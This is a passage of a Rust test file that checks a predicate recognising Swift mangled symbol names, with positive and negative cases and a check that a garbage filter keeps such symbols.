    assert!(is_swift_mangled_symbol(s, s.len()));

    // _TtP protocol metadata.
    let s = "_TtP10Foundation10CodingKey_";
    assert!(is_swift_mangled_symbol(s, s.len()));

    // Full filter check: chaos heuristic no longer drops these.
    assert!(!is_garbage(
        "_TtC7TeamAppP33_464D6157E8D96D7B7ECE5C61C5669F7019ResourceBundleClass"
    ));
}

#[test]
fn test_is_swift_mangled_symbol_negative() {
    // Too short.
    assert!(!is_swift_mangled_symbol("_Tt", 3));

    // Non-Swift prefix, even if content is alphanumeric.
    let s = "_Temporary_Internet_Files";
    assert!(!is_swift_mangled_symbol(s, s.len()));

    // Body has path separator.
    let s = "_TtC7TeamApp/GeneratedAssetSymbols";
    assert!(!is_swift_mangled_symbol(s, s.len()));

    // Prefix OK but body loaded with special chars.
    let s = "_$s!!!@@@###$$$%%%^^^&&&***((()))";
    assert!(!is_swift_mangled_symbol(s, s.len()));
}

// ===== JWT predicate =====
